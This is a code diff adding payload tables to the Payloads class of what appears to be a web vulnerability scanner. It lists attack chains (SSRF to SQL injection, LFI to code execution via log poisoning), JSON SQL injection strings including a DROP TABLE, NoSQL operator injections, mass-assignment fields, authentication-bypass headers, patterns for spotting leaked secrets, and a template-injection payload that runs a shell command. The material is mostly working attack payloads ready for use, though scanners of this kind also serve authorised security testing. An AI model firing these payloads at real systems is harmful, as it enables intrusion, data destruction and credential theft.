@@ -2457,6 +2457,54 @@ class Payloads:
         "{{[].__class__.__base__.__subclasses__()[XXX]('id',shell=True,stdout=-1).communicate()[0]}}",
     ]
 
+    # Deep Scan - Chain templates mapping chain names to attack step sequences
+    DEEP_SCAN_CHAIN_TEMPLATES = {
+        "ssrf_to_sqli": ["probe_ssrf_internal", "confirm_access", "inject_sqli_via_redirect"],
+        "lfi_to_rce": ["confirm_lfi", "identify_log_path", "poison_log_ua", "include_poisoned_log"],
+        "xss_to_csrf": ["confirm_reflection", "craft_csrf_payload", "inject_via_xss"],
+        "sqli_to_dump": ["confirm_sqli", "enumerate_tables", "extract_data"],
+        "auth_bypass_chain": ["test_direct", "test_idor", "test_privilege_escalation"],
+        "api_full_scan": ["fingerprint", "test_bola", "test_injection", "test_mass_assign", "test_auth_bypass"],
+    }
+
+    # API Vulnerability Payloads - specifically formatted for API testing
+    API_VULN_PAYLOADS = {
+        "json_sqli": [
+            '{"id": "1 OR 1=1--"}',
+            '{"id": "1\' OR \'1\'=\'1"}',
+            '{"id": "1; DROP TABLE users--"}',
+            '{"search": "\' UNION SELECT NULL,NULL,NULL--"}',
+            '{"filter": "1 AND SLEEP(5)"}',
+        ],
+        "json_nosqli": [
+            '{"username": {"$gt": ""}}',
+            '{"username": {"$ne": null}}',
+            '{"$where": "sleep(5000)"}',
+            '{"username": {"$regex": ".*"}}',
+            '{"password": {"$exists": true}}',
+        ],
+        "mass_assignment_fields": [
+            "role", "admin", "is_admin", "isAdmin", "privilege",
+            "permissions", "user_type", "account_type", "is_superuser",
+            "is_staff", "verified", "approved", "status", "plan", "tier",
+        ],
+        "auth_bypass_headers": [
+            {"Authorization": ""},
+            {"Authorization": "Bearer null"},
+            {"Authorization": "Bearer undefined"},
+            {"X-Custom-IP-Authorization": "127.0.0.1"},
+            {"X-Forwarded-For": "127.0.0.1"},
+            {"X-Original-URL": "/admin"},
+            {"X-Rewrite-URL": "/admin"},
+        ],
+        "sensitive_response_patterns": [
+            "password", "passwd", "secret", "token", "api_key", "apiKey",
+            "private_key", "privateKey", "ssn", "social_security",
+            "credit_card", "creditCard", "cvv", "bank_account",
+            "access_token", "refresh_token", "session_id",
+        ],
+    }
+
 
 class Colors:
     """Terminal Colors"""
